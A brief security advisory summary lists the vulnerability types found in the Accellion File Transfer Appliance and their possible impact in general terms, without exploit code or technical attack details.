Accellion File Transfer Appliance is prone to multiple remote vulnerabilities, including:

- Multiple privilege-escalation issues
- A directory-traversal issue
- An HTML-injection issue
- A remote command-injection issue

An attacker may leverage these issues to execute arbitrary script code within the context of the webserver, steal cookie-based authentication credentials, obtain sensitive information, and execute arbitrary code or commands with superuser privileges. Other attacks are also possible.
